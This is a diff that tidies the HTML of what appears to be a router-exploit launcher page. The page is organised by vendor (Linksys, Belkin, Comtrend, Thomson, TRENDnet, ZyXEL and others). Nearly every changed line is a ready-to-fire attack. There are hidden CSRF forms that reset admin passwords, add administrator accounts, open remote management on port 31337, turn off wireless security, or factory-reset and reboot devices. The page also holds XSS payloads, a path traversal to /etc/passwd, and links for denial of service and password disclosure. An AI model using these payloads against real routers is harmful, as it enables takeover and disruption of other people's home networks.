@@ -7,6 +7,7 @@
 		<meta name="apple-mobile-web-app-capable" content="yes" />
 		<meta charset="UTF-8" />
 	<style>
+	
 	a,a:visited,a:active,a:link {
 		color:white;
 		text-decoration:none;
@@ -2225,8 +2226,8 @@ a=a+1
 <article>
 	<div>04/13/08</div>
 	<div><a href="http://hakim.ws/2wire/dsldos.html">[+]</a></div>
-	<div><a href="http://home/xslt?page=%^">17x 18x 20x 27x DSL denial of service</a></div>
-	<div><a href="javascript:setip('/xslt?page=%^')">[SET IP]</a></div>
+	<div><a href="http://home/xslt?page%3D%25%5E">17x 18x 20x 27x DSL denial of service</a></div>
+	<div><a href="javascript:setip('%2Fxslt?page%3D%25%5E')">[SET IP]</a></div>
 </article>
 
 <article>
@@ -2409,7 +2410,7 @@ a=a+1
 	<div>01/30/13</div>
 	<div><a href="http://1337day.com/exploit/20264">[+]</a></div>
 	<div><a href="http://10.0.0.2/password.cgi"></a>ASMAX AR 1004g Password Disclosure</div>
-	<div><a href="javascript:setip(/password.cgi)">[SET IP]</a></div>
+	<div><a href="javascript:setip('/password.cgi')">[SET IP]</a></div>
 </article>
 
 <article>
@@ -2478,14 +2479,14 @@ a=a+1
 <div style="float: right"><a href="#">^ Top</a></div>
 </section><br><br><section id="belkin">
 <form name='belkindns' action='http://192.168.2.1/cgi-bin/setup_dns.exe' method='post'>
-<input type=hidden name='dns1_1'>
-<input type=hidden name='dns1_2'>
-<input type=hidden name='dns1_3'>
-<input type=hidden name='dns1_4'>
-<input type=hidden name='dns2_1'>
-<input type=hidden name='dns2_2'>
-<input type=hidden name='dns2_3'>
-<input type=hidden name='dns2_4'>
+<input type="hidden" name='dns1_1'>
+<input type="hidden" name='dns1_2'>
+<input type="hidden" name='dns1_3'>
+<input type="hidden" name='dns1_4'>
+<input type="hidden" name='dns2_1'>
+<input type="hidden" name='dns2_2'>
+<input type="hidden" name='dns2_3'>
+<input type="hidden" name='dns2_4'>
 </form>
 <form name='belkinrest' action="http://192.168.2.1/cgi-bin/restore.exe" method='post'>
 <input type="hidden" name="page" value="tools_restore">
@@ -2596,27 +2597,27 @@ a=a+1
 </article>
 <div style="float: right"><a href="#">^ Top</a></div>
 </section><br><br><section id="cisco">
-<form name='ea2700pass' action='http://192.168.1.1/apply.cgi' method='post'><input type=hidden name='submit_button' value="Management"><input type=hidden name='action' value="Apply"><input type=hidden name='change_action' value=""><input type=hidden name='PasswdModify' value="1"><input type=hidden name='http_passwd' value="password"><input type=hidden name='http_passwdConfirm' value="password"></form>
-<form name='ea2700xss' action='http://192.168.1.1/apply.cgi' method='post'><input type=hidden name='submit_button' value="xss';alert(1)//934"><input type=hidden name='action' value="Apply"></form>
-<form name='ea2700path' action='http://192.168.1.1/apply.cgi' method='post'><input type=hidden name='submit_button' value="Wireless_Basic"><input type=hidden name='change_action' value="gozila_cgi"><input type=hidden name='next_page' value="/etc/passwd"></form>
-<form name='wrtwifi' action='http://192.168.1.1/Security.tri' method='post'><input type=hidden name='SecurityMode' value="0"><input type=hidden name='layout' value="en"></form>
-<form name='wrtdefault' action='http://192.168.1.1/factdefa.tri' method='post'><input type=hidden name='FactoryDefaults' value="Yes"><input type=hidden name='layout' value="en"></form>
+<form name='ea2700pass' action='http://192.168.1.1/apply.cgi' method='post'><input type="hidden" name='submit_button' value="Management"><input type="hidden" name='action' value="Apply"><input type="hidden" name='change_action' value=""><input type="hidden" name='PasswdModify' value="1"><input type="hidden" name='http_passwd' value="password"><input type="hidden" name='http_passwdConfirm' value="password"></form>
+<form name='ea2700xss' action='http://192.168.1.1/apply.cgi' method='post'><input type="hidden" name='submit_button' value="xss';alert(1)//934"><input type="hidden" name='action' value="Apply"></form>
+<form name='ea2700path' action='http://192.168.1.1/apply.cgi' method='post'><input type="hidden" name='submit_button' value="Wireless_Basic"><input type="hidden" name='change_action' value="gozila_cgi"><input type="hidden" name='next_page' value="/etc/passwd"></form>
+<form name='wrtwifi' action='http://192.168.1.1/Security.tri' method='post'><input type="hidden" name='SecurityMode' value="0"><input type="hidden" name='layout' value="en"></form>
+<form name='wrtdefault' action='http://192.168.1.1/factdefa.tri' method='post'><input type="hidden" name='FactoryDefaults' value="Yes"><input type="hidden" name='layout' value="en"></form>
 <form name='wrtadmin' action='http://192.168.1.1/manage.tri' method='post'>
-<input type=hidden name=http_passwd>
-<input type=hidden name=http_passwdConfirm>
-<input type=hidden name=remote_management>
-<input type=hidden name=remote_mgt_https value=0>
-<input type=hidden name=http_enable value=1>
-<input type=hidden name=https_enable value=0>
-<input type=hidden name=PasswdModify value=1>
-<input type=hidden name=_http_enable value=1>
-<input type=hidden name=web_wl_filter value=1>
-<input type=hidden name=remote_management value=1>
-<input type=hidden name=http_wanport value=31337>
-<input type=hidden name=upnp_enable value=1>
-<input type=hidden name=layout value=en>
+<input type="hidden" name=http_passwd>
+<input type="hidden" name=http_passwdConfirm>
+<input type="hidden" name=remote_management>
+<input type="hidden" name=remote_mgt_https value=0>
+<input type="hidden" name=http_enable value=1>
+<input type="hidden" name=https_enable value=0>
+<input type="hidden" name=PasswdModify value=1>
+<input type="hidden" name=_http_enable value=1>
+<input type="hidden" name=web_wl_filter value=1>
+<input type="hidden" name=remote_management value=1>
+<input type="hidden" name=http_wanport value=31337>
+<input type="hidden" name=upnp_enable value=1>
+<input type="hidden" name=layout value=en>
 </form>
-<form action="http://192.168.1.1/setup.cgi" method="POST" name="wag120pass">
+<form action="http://192.168.1.1/setup.cgi" method="post" name="wag120pass">
 <input type="hidden" name="user_list" value="1">
 <input type="hidden" name="h_user_list" value="1">
 <input type="hidden" name="sysname" value="admin">
@@ -2643,7 +2644,7 @@ a=a+1
 <input type="hidden" name="message" value="">
 <input type="hidden" name="h_wps_cur_status" value=""> 
 </form>
-<form action="http://192.168.1.1/setup.cgi" method="POST" name="wag120add">
+<form action="http://192.168.1.1/setup.cgi" method="post" name="wag120add">
 <input type="hidden" name="user_list" value="2">
 <input type="hidden" name="h_user_list" value="2">
 <input type="hidden" name="sysname" value="ircrash">
@@ -2670,8 +2671,8 @@ a=a+1
 <input type="hidden" name="message" value="">
 <input type="hidden" name="h_wps_cur_status" value="">
 </form>
-<form name="CSRFxssPWN" enctype="text/plain" action="http://10.0.1.1/apply.cgi" method="post"/>
-<input type="hidden" name="submit_button" value="%27%3balert(%22i CaN hAZ XSS by G42%22)%3b//&"/>
+<form name="CSRFxssPWN" enctype="text/plain" action="http://10.0.1.1/apply.cgi" method="post">
+<input type="hidden" name="submit_button" value="%27%3balert(%22i CaN hAZ XSS by G42%22)%3b//&amp;">
 </form>
 <h2>Cisco</h2>
 <h3><a href="javascript:img('Linksys EA2700')">Linksys EA2700</a>, <a href="javascript:img('Linksys WRT54G')">Linksys WRT54G</a>, <a href="javascript:img('WAG120N')">Linksys WAG120N</a>, <a href="javascript:img('Linksys X3000')">Linksys X3000</a>, <a href="javascript:img('Linksys WRT110')">Linksys WRT110</a>, <a href="javascript:img('EPC3925')">EPC3925</a></h3>
@@ -2855,8 +2856,8 @@ a=a+1
 <input type="hidden" name="security:settings/password_confirm" value="password">
 <input type="hidden" name="security:settings/idle_timeout" value="30">
 </form>
-<form method="POST" name="dsl2640" action="#"></form>
-<form method="POST" name="f2640U" action="http://192.168.1.1/wizisp.cgi?quick=1&sntpRefresh=0&wizTmpSntpEnable=0&wizTmpDST=0">
+<form method="post" name="dsl2640" action="#"></form>
+<form method="post" name="f2640U" action="http://192.168.1.1/wizisp.cgi?quick=1&amp;sntpRefresh=0&amp;wizTmpSntpEnable=0&amp;wizTmpDST=0"></form>
 
 <div style="float: right"><a href="#">^ Top</a></div>
 
@@ -3093,7 +3094,7 @@ a=a+1
 </article>
 <div style="float: right"><a href="#">^ Top</a></div>
 </section><br><br><section id="comtrend">
-<form action="http://192.168.1.1/password.cgi" method="POST" name="comtrendpass">
+<form action="http://192.168.1.1/password.cgi" method="post" name="comtrendpass">
 <input type="hidden" name="sptPassword">
 <input type="hidden" name="usrPassword">
 <input type="hidden" name="sysPassword">
@@ -3112,7 +3113,7 @@ a=a+1
 	<div>01/08/12</div>
 	<div><a href="javascript:alert('Busindre')">[+]</a></div>
 	<div><a href="http://192.168.1.1/scsrvcntr.cmd?action=save&amp;ftp=1&amp;ftp=3&amp;http=1&amp;http=3&amp;icmp=1&amp;snmp=1&amp;snmp=3&amp;ssh=1&amp;ssh=3&amp;telnet=1&amp;telnet=3&amp;tftp=1&amp;tftp=3">CT-53XX CT-5071 CT-56XX Enable remote admin</a></div>
-	<div><a href="javascript:setip('http://192.168.1.1/scsrvcntr.cmd?action=save&amp;ftp=1&amp;ftp=3&amp;http=1&amp;http=3&amp;icmp=1&snmp=1&amp;snmp=3&amp;ssh=1&amp;ssh=3&amp;telnet=1&amp;telnet=3&amp;tftp=1&amp;tftp=3')">[SET IP]</a></div>
+	<div><a href="javascript:setip('http://192.168.1.1/scsrvcntr.cmd?action=save&amp;ftp=1&amp;ftp=3&amp;http=1&amp;http=3&amp;icmp=1&amp;snmp=1&amp;snmp=3&amp;ssh=1&amp;ssh=3&amp;telnet=1&amp;telnet=3&amp;tftp=1&amp;tftp=3')">[SET IP]</a></div>
 </article>
 
 <article>
@@ -3139,9 +3140,8 @@ a=a+1
 <article>
 	<div>01/23/10</div>
 	<div><a href="http://foro.undersecurity.net/read.php?16,6320">[+]</a></div>
-	<div><a href=javascript:urlxss("http://192.168.1.1/scvrtsrv.cmd?action=add&amp;srvName=URLXSS&amp;srvAddr=192.168.1.1&amp;proto=1,&amp;eStart=1,&amp;eEnd=1,&amp;iStart=1,&amp;iEnd=1,");>CT-507IT Cross site scripting</a></div>
+	<div><a href="javascript:urlxss('http://192.168.1.1/scvrtsrv.cmd?action=add&amp;srvName=URLXSS&amp;srvAddr=192.168.1.1&amp;proto=1,&amp;eStart=1,&amp;eEnd=1,&amp;iStart=1,&amp;iEnd=1');">CT-507IT Cross site scripting</a></div>
 </article>
-
 <article>
 	<div>03/04/08</div>
 	<div><a href="http://seclists.org/bugtraq/2008/Dec/226">[+]</a></div>
@@ -3172,7 +3172,7 @@ a=a+1
 
 <section id="EE">
 <h2>EE</h2>
-<h3><a href="javascript:img('EE Brightbox')">EE BrightBox</a>
+<h3><a href="javascript:img('EE Brightbox')">EE BrightBox</a></h3>
 
 <article>
 	<div>01/14/14</div>
@@ -3206,7 +3206,7 @@ a=a+1
 <section id="freebox">
 <h2>Freebox</h2>
 <h3><a href="javascript:img('Freebox V6')">Freebox V6</a></h3>
-<form name="freeboxdos" action="http://mafreebox.free.fr/system.cgi" method="POST">
+<form name="freeboxdos" action="http://mafreebox.free.fr/system.cgi" method="post">
       <input type="hidden" name="method" value="system.reboot" />
       <input type="hidden" name="redirect_after" value="about:blank" />
       <input type="hidden" name="timeout" value="60" />
@@ -3355,8 +3355,8 @@ a=a+1
 </article>
 <div style="float: right"><a href="#">^ Top</a></div>
 </section><br><br><section id="motorola">
-<img src="" name="img1" style="visibility:hidden">
-<img src="" name="img2" style="visibility:hidden">
+<img src="" name="img1" style="visibility:hidden" alt="">
+<img src="" name="img2" style="visibility:hidden" alt="">
 <h2>Motorola</h2>
 <h3><a href="javascript:img('SBG900')">SBG900</a></h3>
 	
@@ -3614,8 +3614,8 @@ a=a+1
 <div style="float: right"><a href="#">^ Top</a></div>
 </section><br><br><section id="sagem">
 <h2>Sagem</h2>
-<form method="POST" name="sagem2604" action="http://192.168.1.254/password.cgi"></form>
-<form method="POST" name="f1500WG" action="http://192.168.1.2/m_atminttemp11.stm">
+<form method="post" name="sagem2604" action="http://192.168.1.254/password.cgi"></form>
+<form method="post" name="f1500WG" action="http://192.168.1.2/m_atminttemp11.stm"></form>
 <h3><a href="javascript:img('F@ST 2604')">F@ST 2604</a>, <a href="javascript:img('F@ST 3184')">F@ST 3184</a>, <a href="javascript:img('Fast 3304-V1')">Fast 3304-V1</a>, <a href="javascript:img('3304-V2')">3304-V2</a>, <a href="javascript:img('3464')">3464</a>, <a href="javascript:img('3504')">3504</a></h3>
 
 <article>
@@ -3737,19 +3737,19 @@ a=a+1
 </article>
 <div style="float: right"><a href="#">^ Top</a></div>
 </section><br><br><section id="thomson">
-<form name='thomsonadmin' action='http://192.168.1.254/cgi/b/users/cfg/usraccedit/?be=0&l0=2&l1=9' method='post'>
-<input type=hidden name='0' value='10'><input type=hidden name='1' value='usrAccApply'><input type=hidden name='34' value='NewUser'><input type=hidden name='36' value='1'><input type=hidden name='33' value='telmex'><input type=hidden name='31' value='Administrator'>
+<form name='thomsonadmin' action='http://192.168.1.254/cgi/b/users/cfg/usraccedit/?be=0&amp;l0=2&amp;l1=9' method='post'>
+<input type="hidden" name='0' value='10'><input type="hidden" name='1' value='usrAccApply'><input type="hidden" name='34' value='NewUser'><input type="hidden" name='36' value='1'><input type="hidden" name='33' value='telmex'><input type="hidden" name='31' value='Administrator'>
 </form>
-<form name='thomsoncall' action='http://bthomehub/cgi/b/_voip_/stats//?ce=1&be=0&l0=-1&l1=-1&name=' method='post'>
-<input type=hidden name='0' value='30'><input type=hidden name='1' value=''></form>
-<form name='thomsondos' action='http://192.168.1.254/cgi/b/info/reset/?be=0&l0=0&l1=1&tid=RESET' method='post'>
-<input type=hidden name='0' value='18'><input type=hidden name='1' value=''></form>
-<form action='http://192.168.1.254/cgi/b/sfltr/cfg/?be=0&l0=2&l1=5' method='post' name=thomsondom>
-<input type=hidden name='0' value=19><input type=hidden name='1' value=''>
-<input type=hidden name='30' value='1'><input type=hidden name='31' value='1'>
-<input type=hidden name='32' id=dom1 value='origen'><input type=hidden name='33' value='2'>
-<input type=hidden name='34' id=dom2 value='destino'></form>
-<form name='btra' action='http://192.168.1.254/cgi/b/ras//?ce=1&be=1&l0=5&l1=5' method='post'><input type='hidden' name='0' value='31'><input type='hidden' name='1' value=''><input type='hidden' name='30' value='12345678'></form>
+<form name='thomsoncall' action='http://bthomehub/cgi/b/_voip_/stats//?ce=1&amp;be=0&amp;l0=-1&amp;l1=-1&amp;name=' method='post'>
+<input type="hidden" name='0' value='30'><input type="hidden" name='1' value=''></form>
+<form name='thomsondos' action='http://192.168.1.254/cgi/b/info/reset/?be=0&amp;l0=0&amp;l1=1&amp;tid=RESET' method='post'>
+<input type="hidden" name='0' value='18'><input type="hidden" name='1' value=''></form>
+<form action='http://192.168.1.254/cgi/b/sfltr/cfg/?be=0&amp;l0=2&amp;l1=5' method="post" name="thomsondom">
+<input type="hidden" name='0' value=19><input type="hidden" name='1' value=''>
+<input type="hidden" name='30' value='1'><input type="hidden" name='31' value='1'>
+<input type="hidden" name='32' id=dom1 value='origen'><input type="hidden" name='33' value='2'>
+<input type="hidden" name='34' id=dom2 value='destino'></form>
+<form name='btra' action='http://192.168.1.254/cgi/b/ras//?ce=1&amp;be=1&amp;l0=5&amp;l1=5' method='post'><input type="hidden" name='0' value='31'><input type="hidden" name='1' value=''><input type="hidden" name='30' value='12345678'></form>
 <form name='btwifi' action="http://192.168.1.254/cgi/b/_wli_/cfg//" method="post"><input type="hidden" name="0" value="10"><input type="hidden" name="1" value=""><input type="hidden" name="32" value=""><input type="hidden" name="33" value=""><input type="hidden" name="34" value="2"><input type="hidden" name="35" value="1"><input type="hidden" name="45" value="11"><input type="hidden" name="47" value="1"></form>
 <h2>Thomson</h2>
 <h3><a href="javascript:img('SpeedTouch ST585')">SpeedTouch ST585</a>, <a href="javascript:img('TG585n')">TG585n</a>, <a href="javascript:img('bthomehub')">7G (bthomehub)</a></h3>
@@ -3771,8 +3771,8 @@ a=a+1
 <article>
 	<div>04/02/11</div>
 	<div><a href="javascript:alert('Edgard_Chammas')">[+]</a></div>
-	<div><a href="http://192.168.1.254/cgi/b/ic/connect/?url=<script>alert(1)</script>">ST585 Cross site scripting</a></div>
-	<div><a href="javascript:setip('/cgi/b/ic/connect/?url=<script>alert(1)</script>')">[SET IP]</a></div>
+	<div><a href="http://192.168.1.254/cgi/b/ic/connect/?url=%3Cscript%3Ealert(1)%3C%2Fscript%3E">ST585 Cross site scripting</a></div>
+	<div><a href="javascript:setip('/cgi/b/ic/connect/?url=%3Cscript%3Ealert(1)%3C%2Fscript%3E')">[SET IP]</a></div>
 </article>
 
 <article>
@@ -3891,14 +3891,14 @@ a=a+1
 <iframe name="a" style="display:none"></iframe>
 </section><br><br><section id="trendnet">
 
-<form name="trendCSRF" action="http://192.168.10.1/setSysAdm.cgi" method="post"/>
+<form name="trendCSRF" action="http://192.168.10.1/setSysAdm.cgi" method="post">
 <input type="hidden" name="page" value="/adm/management.asp"/>
 <input type="hidden" name="admuser" value="admin"/>
 <input type="hidden" name="admpass" value="password"/>
 <input type="hidden" name="AuthTimeout" value="600"/>
 </form>
 
-<form name="trendCSRF2" action="http://192.168.10.1/uapply.cgi" method="post"/>
+<form name="trendCSRF2" action="http://192.168.10.1/uapply.cgi" method="post">
 <input type="hidden" name="page" value="/adm/management.asp"/>
 <input type="hidden" name="remote_en" value="1"/>
 <input type="hidden" name="http_wanport" value="31337"/>
@@ -4081,7 +4081,7 @@ a=a+1
 
 <article>
 	<div>04/06/13</div>
-	<div><a href=http://www.youtube.com/watch?v=8xJGkRQB0QM>[+]</a></div>
+	<div><a href="http://www.youtube.com/watch?v=8xJGkRQB0QM">[+]</a></div>
 	<div><a href="http://192.168.1.1/Forms/tools_admin_1">TD-8817 TD-W8901G blank admin password CSRF</a></div>
 	<div><a href="javascript:setip('/Forms/tools_admin_1');">[SET IP]</a></div>
 </article>
@@ -4098,10 +4098,15 @@ a=a+1
 
 <section id="zyxel">
 
-<form name="zyxelxss" mehod="post" action="http://192.168.1.1/forms/General_1"><input name="sysSystemname" type='hidden'><input name="sysDomainname" type='hidden'><input name="StdioTimout" value="0" type='hidden'><input name="sysSubmit" value="Apply" type='hidden'></form>
+<form name="zyxelxss" method="post" action="http://192.168.1.1/forms/General_1">
+<input name="sysSystemname" type="hidden">
+<input name="sysDomainname" type="hidden">
+<input name="StdioTimout" value="0" type="hidden">
+<input name="sysSubmit" value="Apply" type="hidden">
+</form>
 
 <form id="zyxelxssp" method="post" action="http://192.168.1.1/Forms/PortForwarding_Edit_1">
-<input name="PortRule_Name" value='' type='hidden'><input name="PortRule_SPort" value="77" type='hidden'><input name="PortRule_EPort" value="77" type='hidden'><input name="PortRule_SrvAddr" value="10.0.0.1" type='hidden'></form>
+<input name="PortRule_Name" value='' type="hidden"><input name="PortRule_SPort" value="77" type="hidden"><input name="PortRule_EPort" value="77" type="hidden"><input name="PortRule_SrvAddr" value="10.0.0.1" type="hidden"></form>
 
 
 <h2>ZyXEL</h2>
